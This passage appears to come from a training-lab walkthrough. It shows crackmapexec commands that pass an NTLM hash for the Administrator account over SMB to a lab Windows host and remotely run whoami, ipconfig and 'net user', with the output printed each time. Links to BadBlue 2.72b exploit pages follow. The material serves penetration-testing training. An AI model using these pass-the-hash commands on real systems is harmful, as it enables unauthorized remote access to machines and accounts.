root@attackdefense:~# crackmapexec smb 10.0.20.157 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami"
SMB         10.0.20.157     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.0.20.157     445    ATTACKDEFENSE    attackdefense\administrator
```

```
root@attackdefense:~# crackmapexec smb 10.0.20.157 -u administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"
SMB         10.0.20.157     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] AttackDefense\administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.0.20.157     445    ATTACKDEFENSE    Windows IP Configuration
SMB         10.0.20.157     445    ATTACKDEFENSE    
SMB         10.0.20.157     445    ATTACKDEFENSE    
SMB         10.0.20.157     445    ATTACKDEFENSE    Ethernet adapter Ethernet:
SMB         10.0.20.157     445    ATTACKDEFENSE    
SMB         10.0.20.157     445    ATTACKDEFENSE    Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
SMB         10.0.20.157     445    ATTACKDEFENSE    Link-local IPv6 Address . . . . . : fe80::d453:7393:378a:94b3%4
SMB         10.0.20.157     445    ATTACKDEFENSE    IPv4 Address. . . . . . . . . . . : 10.0.20.157
SMB         10.0.20.157     445    ATTACKDEFENSE    Subnet Mask . . . . . . . . . . . : 255.255.240.0
SMB         10.0.20.157     445    ATTACKDEFENSE    Default Gateway . . . . . . . . . : 10.0.16.1

```

```
root@attackdefense:~# crackmapexec smb 10.0.20.157 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "net user"
SMB         10.0.20.157     445    ATTACKDEFENSE    [*] Windows 10.0 Build 17763 x64 (name:ATTACKDEFENSE) (domain:AttackDefense) (signing:False) (SMBv1:False)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] AttackDefense\Administrator e3c61a68f1b89ee6c8ba9507378dc88d (Pwn3d!)
SMB         10.0.20.157     445    ATTACKDEFENSE    [+] Executed command 
SMB         10.0.20.157     445    ATTACKDEFENSE    User accounts for \\
SMB         10.0.20.157     445    ATTACKDEFENSE    
SMB         10.0.20.157     445    ATTACKDEFENSE    -------------------------------------------------------------------------------
SMB         10.0.20.157     445    ATTACKDEFENSE    Administrator            DefaultAccount           Guest
SMB         10.0.20.157     445    ATTACKDEFENSE    student                  WDAGUtilityAccount
SMB         10.0.20.157     445    ATTACKDEFENSE    The command completed with one or more errors.

```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2340.pdf

[BadBlue 2.72b - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/4715)

[BadBlue 2.72b PassThru Buffer Overflow](https://www.rapid7.com/db/modules/exploit/windows/http/badblue_passthru/)

